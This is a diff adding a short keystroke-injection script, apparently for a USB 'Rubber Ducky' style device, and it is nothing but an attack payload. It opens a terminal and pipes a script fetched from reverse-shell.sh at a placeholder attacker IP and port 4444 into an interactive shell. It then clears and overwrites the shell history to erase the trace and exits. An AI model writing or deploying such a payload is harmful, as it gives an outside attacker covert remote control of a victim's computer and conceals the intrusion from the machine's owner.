@@ -1,0 +1,15 @@
+CTRL ALT t
+DELAY 300
+STRING sh -c "curl https://reverse-shell.sh/attacker_ip:4444 | sh -i &" && exit
+ENTER
+DELAY 500
+CTRL ALT t
+DELAY 500
+STRING history -c
+ENTER
+DELAY 500
+STRING history -w
+ENTER
+DELAY 300
+STRING exit
+ENTER
